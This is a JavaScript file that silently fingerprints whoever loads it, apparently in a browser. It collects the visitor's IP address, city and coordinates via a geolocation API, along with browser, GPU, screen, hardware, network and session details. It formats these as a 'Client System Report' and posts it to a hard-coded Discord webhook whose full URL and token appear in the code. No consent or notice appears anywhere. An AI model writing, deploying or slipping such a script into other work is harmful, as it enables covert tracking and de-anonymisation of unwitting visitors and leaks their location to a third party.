function sendToDiscord(message) {
    const webhookURL = "https://ptb.discord.com/api/webhooks/1335486891637604392/3RM5f3iF1tpQPiPLp2Up6V2DeB07JErNG2unGV5J9zvalBAWL6ram8c4-eTuKy85apGc"; 

    const payload = { content: message };

    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log("Message sent successfully!");
        } else {
            console.error("Failed to send message: ", response.status);
        }
    })
    .catch(error => {
        console.error("Error sending message:", error);
        sendToDiscord(`⚠️ **Error**: ${error.message}`);
    });
}

async function MaintainWSALW() {
    try {
        let gl = document.createElement('canvas').getContext('webgl');
        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        let gpuVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unknown";
        let gpuRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";

        let performanceData = window.performance.memory || {};
        let deviceData = navigator.deviceMemory ? navigator.deviceMemory * 1024 : "Unknown"; // Convert GB to MB

        let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
        
        let browserData = {
            userAgent: navigator.userAgent,
            browserName: navigator.userAgent.includes("Edg") ? "Microsoft Edge"
                        : navigator.userAgent.includes("Chrome") ? "Google Chrome"
                        : navigator.userAgent.includes("Firefox") ? "Mozilla Firefox"
                        : navigator.userAgent.includes("Safari") ? "Apple Safari"
                        : "Unknown",
            browserVersion: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edg)\/(\d+\.\d+\.\d+\.\d+)/) 
                            ? navigator.userAgent.match(/(Chrome|Firefox|Safari|Edg)\/(\d+\.\d+\.\d+\.\d+)/)[2] 
                            : "Unknown",
            platform: navigator.platform,
            mobile: /Mobi|Android/i.test(navigator.userAgent) ? "Yes" : "No",
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled ? "Enabled" : "Disabled",
            javaEnabled: navigator.javaEnabled ? "Enabled" : "Disabled"
        };

        let screenData = {
            screenWidth: screen.width,
            screenHeight: screen.height,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            orientation: screen.orientation.type
        };

        let hardwareData = {
            cpuThreads: navigator.hardwareConcurrency || "Unknown",
            availableMemory: deviceData,
            totalJSHeapSize: performanceData.totalJSHeapSize || "Unknown",
            usedJSHeapSize: performanceData.usedJSHeapSize || "Unknown",
            gpuVendor: gpuVendor,
            gpuInfo: gpuRenderer
        };

        let networkData = {
            online: navigator.onLine ? "Online" : "Offline",
            connectionType: connection.effectiveType || "Unknown",
            downlinkSpeed: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
            rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown"
        };

        let sessionData = {
            referrer: document.referrer || "None",
            location: window.location.href,
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            currentTime: new Date().toLocaleString(),
            previousPages: window.history.length
        };

        let ipData = await fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => ({
                ip: data.ip,
                country: data.country_name,
                region: data.region,
                city: data.city,
                zip: data.postal,
                latitude: data.latitude,
                longitude: data.longitude,
                timezone: data.timezone,
                isp: data.org,
                asn: data.asn
            }))
            .catch(() => ({
                ip: "Unknown",
                country: "Unknown",
                region: "Unknown",
                city: "Unknown",
                zip: "Unknown",
                latitude: "Unknown",
                longitude: "Unknown",
                timezone: "Unknown",
                isp: "Unknown",
                asn: "Unknown"
            }));

        let fullMessage = `**Client System Report**
━━━━━━━━━━━━━━━━━━━━━
🌐 **Network Info**
  ┗ IP Address: ${ipData.ip}
  ┗ Location: ${ipData.city}, ${ipData.region}, ${ipData.country} (${ipData.zip})
  ┗ Geo Coordinates: ${ipData.latitude}, ${ipData.longitude}
  ┗ Timezone: ${ipData.timezone}
  ┗ ISP: ${ipData.isp}
  ┗ ASN: ${ipData.asn}

🖥️ **System & Browser**
  ┗ Browser: ${browserData.browserName} (v${browserData.browserVersion})
  ┗ Platform: ${browserData.platform}
  ┗ Mobile Device: ${browserData.mobile}
  ┗ System Language: ${browserData.language}
  ┗ Cookies: ${browserData.cookiesEnabled}
  ┗ Java Enabled: ${browserData.javaEnabled}

🎨 **Display & Graphics**
  ┗ Screen Resolution: ${screenData.screenWidth}x${screenData.screenHeight}
  ┗ Window Size: ${screenData.windowWidth}x${screenData.windowHeight}
  ┗ Color Depth: ${screenData.colorDepth} bit
  ┗ Pixel Ratio: ${screenData.pixelRatio}
  ┗ Screen Orientation: ${screenData.orientation}
  ┗ GPU Vendor: ${hardwareData.gpuVendor}
  ┗ GPU Info: ${hardwareData.gpuInfo}

⚙️ **Hardware & Performance**
  ┗ CPU Threads: ${hardwareData.cpuThreads}
  ┗ Available Memory: ${hardwareData.availableMemory} MB
  ┗ JS Heap Size: ${hardwareData.totalJSHeapSize} MB (Used: ${hardwareData.usedJSHeapSize} MB)

🌍 **Network & Connection**
  ┗ Status: ${networkData.online}
  ┗ Connection Type: ${networkData.connectionType}
  ┗ Downlink Speed: ${networkData.downlinkSpeed}
  ┗ RTT (Latency): ${networkData.rtt}

📅 **Session Details**
  ┗ Referrer: ${sessionData.referrer}
  ┗ Current Page: ${sessionData.location}
  ┗ Timezone: ${sessionData.timeZone}
  ┗ Current Time: ${sessionData.currentTime}
  ┗ Previous Pages Viewed: ${sessionData.previousPages}
━━━━━━━━━━━━━━━━━━━━━`;

        sendToDiscord(fullMessage);
    } catch (error) {
        console.error("An error occurred:", error);
        sendToDiscord(`⚠️ **Error**: ${error.message}`);
    }
}
